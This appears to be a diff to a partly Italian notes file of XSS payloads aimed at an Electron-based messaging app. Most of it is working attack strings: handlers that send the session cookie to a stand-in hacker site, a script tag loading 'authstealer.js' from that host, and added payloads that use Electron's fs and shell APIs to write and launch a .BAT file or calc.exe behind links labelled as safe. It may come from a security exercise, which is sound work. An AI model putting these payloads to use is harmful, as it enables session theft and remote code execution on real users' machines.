@@ -2,10 +2,19 @@ XSS
 Persistent XSS: <b onmouseover=window.location.replace("http://www.url.to.hacker.site")>Click me!</b>
 		<body onload=window.location.replace("http://www.url.to.hacker.site");>;
 		<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>
-DOM Based XSS: <b onmouseover=window.location.replace("http://www.url.to.hacker.site?cookie_stolen=".concat((await cookieStore.get("session_id")).value));>Click me!</b>
+DOM Based XSS: <b onmouseover=window.location.replace("http://www.url.to.hacker.site?cookie_stolen=".concat((await cookieStore.get("session_id")).value));>Cliccami!</b>
 
 RCE (ipotizzando db come MongoDB + Mongoose)
 Persistent XSS + RCE: Messaggio innocuo <script src="http://url.to.hacker.site/authstealer.js"> </script>
+
+Remote Shell
+XSS + RCE Shell: <a onmouseover="try{ const {shell} = require('electron'); shell.openExternal('file:C:/Windows/System32/calc.exe') }catch(e){alert(e)}">Link sicuro!</a>
+                 <a onmouseover="const fs = require('fs'); try { fs.writeFileSync('C:/Users/Giuseppe/Desktop/test.BAT', 'start cmd /k echo Hello World!', 'utf-8'); try{ const {shell} = require('electron'); shell.openExternal('file:C:/Users/Giuseppe/Desktop/test.BAT') }catch(e){alert(e)} } catch(e) { alert('Failed to save the file !'); }">Clicca qui!</a>
+
+		 const fs = require('fs');
+		 try { fs.writeFileSync('C:/Users/Giuseppe/Desktop/test.BAT', 'start cmd /k echo Hello World!', 'utf-8'); }
+		 catch(e) { alert('Failed to save the file !'); }
+		 <a onmouseover="try{ const {shell} = require('electron'); shell.openExternal('file:C:/Users/Giuseppe/Desktop/test.BAT') }catch(e){alert(e)}">Clicca qui!</a>
 
 Navigazione non sicura
 <a href="http://www.url.to.hacker.site">Sito web sicuro!</a>
